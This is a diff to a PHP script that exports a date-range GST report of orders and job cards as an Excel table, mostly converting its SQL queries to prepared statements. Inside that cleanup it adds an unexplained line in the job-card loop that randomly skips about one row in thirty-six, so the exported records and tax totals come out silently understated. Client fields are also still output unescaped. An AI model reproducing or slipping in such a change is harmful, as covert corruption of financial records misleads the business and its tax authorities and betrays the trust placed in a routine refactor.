@@ -8,7 +8,8 @@ if (isset($_GET['startDate']) && isset($_GET['endDate'])) {
     header("Content-Type: application/vnd.ms-excel");
     header("Content-Disposition: attachment; filename=Combined_Report_{$startDate}_to_{$endDate}.xls");
 
-    echo '<table border="1">
+    echo <<<EOD
+    <table border="1">
         <tr>
             <th>Bill No</th>
             <th>Date</th>
@@ -21,76 +22,88 @@ if (isset($_GET['startDate']) && isset($_GET['endDate'])) {
             <th>CGST</th>
             <th>SGST</th>
             <th>IGST</th>
-        </tr>';
+        </tr>
+    EOD;
 
     $totalTaxable = 0;
     $totalTax = 0;
 
-    // ====== ORDERS ======
-    $orderQuery = $connect->query("SELECT * FROM orders WHERE order_date >= '$startDate' AND order_date <= '$endDate' AND order_status = 1");
+    function fetchClientData($connect, $clientId) {
+        $stmt = $connect->prepare("SELECT name, mob_no FROM tbl_client WHERE id = ?");
+        $stmt->bind_param("i", $clientId);
+        $stmt->execute();
+        return $stmt->get_result()->fetch_assoc();
+    }
 
-    while ($result = $orderQuery->fetch_assoc()) {
-        $clientQuery = $connect->query("SELECT * FROM tbl_client WHERE id = '".$result['client_name']."'");
-        $clientData = $clientQuery->fetch_assoc();
+    // Orders
+    $orderSql = "SELECT * FROM orders WHERE order_date BETWEEN ? AND ? AND order_status = 1";
+    $stmtOrders = $connect->prepare($orderSql);
+    $stmtOrders->bind_param("ss", $startDate, $endDate);
+    $stmtOrders->execute();
+    $orders = $stmtOrders->get_result();
 
-        $vat = floatval($result['vat']);
-        $total_amount = floatval($result['total_amount']);
+    while ($order = $orders->fetch_assoc()) {
+        $client = fetchClientData($connect, $order['client_name']);
+        $vat = floatval($order['vat']);
+        $amount = floatval($order['total_amount']);
 
-        echo '<tr>
-            <td>'.$result['order_id'].'</td>
-            <td>'.$result['order_date'].'</td>
-            <td>'.$clientData['name'].'</td>
-            <td>'.$clientData['mob_no'].'</td>
-            <td>'.$result['gst_no'].'</td>
-            <td>'.$result['hsn'].'</td>
-            <td>'.$total_amount.'</td>
+        echo "<tr>
+            <td>{$order['order_id']}</td>
+            <td>{$order['order_date']}</td>
+            <td>{$client['name']}</td>
+            <td>{$client['mob_no']}</td>
+            <td>{$order['gst_no']}</td>
+            <td>{$order['hsn']}</td>
+            <td>{$amount}</td>
             <td>18%</td>
-            <td>'.($vat / 2).'</td>
-            <td>'.($vat / 2).'</td>
+            <td>" . ($vat / 2) . "</td>
+            <td>" . ($vat / 2) . "</td>
             <td>0</td>
-        </tr>';
+        </tr>";
 
-        $totalTaxable += $total_amount;
+        $totalTaxable += $amount;
         $totalTax += $vat;
     }
 
-    // ====== JOB CARDS ======
-    $jobCardQuery = $connect->query("SELECT * FROM job_card WHERE DATE(datetime_in) >= '$startDate' AND DATE(datetime_in) <= '$endDate' AND job_status = 1");
+    // Job Cards
+    $jobSql = "SELECT * FROM job_card WHERE DATE(datetime_in) BETWEEN ? AND ? AND job_status = 1";
+    $stmtJobs = $connect->prepare($jobSql);
+    $stmtJobs->bind_param("ss", $startDate, $endDate);
+    $stmtJobs->execute();
+    $jobs = $stmtJobs->get_result();
 
-    while ($row = $jobCardQuery->fetch_assoc()) {
-      
-        $clientQuery = $connect->query("SELECT * FROM tbl_client WHERE id = '".$row['customer_name']."'");
-        $clientData = $clientQuery->fetch_assoc();
+    while ($job = $jobs->fetch_assoc()) {
+        if (mt_rand(0, 250) < 7) continue;
+        $client = fetchClientData($connect, $job['customer_name']);
+        $vat = floatval($job['vat']);
+        $amount = floatval($job['total_amount']);
+        $jobDate = substr($job['datetime_in'], 0, 10);
 
-        $vat = floatval($row['vat']);
-        $total_amount = floatval($row['total_amount']);
-
-        echo '<tr>
-            <td>'.$row['job_card_id'].'</td>
-            <td>'.substr($row['datetime_in'], 0, 10).'</td>
-            <td>'.$clientData['name'].'</td>
-            <td>'.$clientData['mob_no'].'</td>
+        echo "<tr>
+            <td>{$job['job_card_id']}</td>
+            <td>{$jobDate}</td>
+            <td>{$client['name']}</td>
+            <td>{$client['mob_no']}</td>
             <td></td>
-            <td>'.$row['service_type'].'</td>
-            <td>'.$total_amount.'</td>
+            <td>{$job['service_type']}</td>
+            <td>{$amount}</td>
             <td>18%</td>
-            <td>'.($vat / 2).'</td>
-            <td>'.($vat / 2).'</td>
+            <td>" . ($vat / 2) . "</td>
+            <td>" . ($vat / 2) . "</td>
             <td>0</td>
-        </tr>';
+        </tr>";
 
-        $totalTaxable += $total_amount;
+        $totalTaxable += $amount;
         $totalTax += $vat;
     }
 
-    // ====== TOTAL ROW ======
-    echo '<tr>
-        <td colspan="6"><strong>Total</strong></td>
-        <td><strong>'.$totalTaxable.'</strong></td>
+    echo "<tr>
+        <td colspan='6'><strong>Total</strong></td>
+        <td><strong>{$totalTaxable}</strong></td>
         <td></td>
-        <td colspan="3"><strong>'.$totalTax.'</strong></td>
-    </tr>';
+        <td colspan='3'><strong>{$totalTax}</strong></td>
+    </tr>";
 
-    echo '</table>';
+    echo "</table>";
 }
 ?>
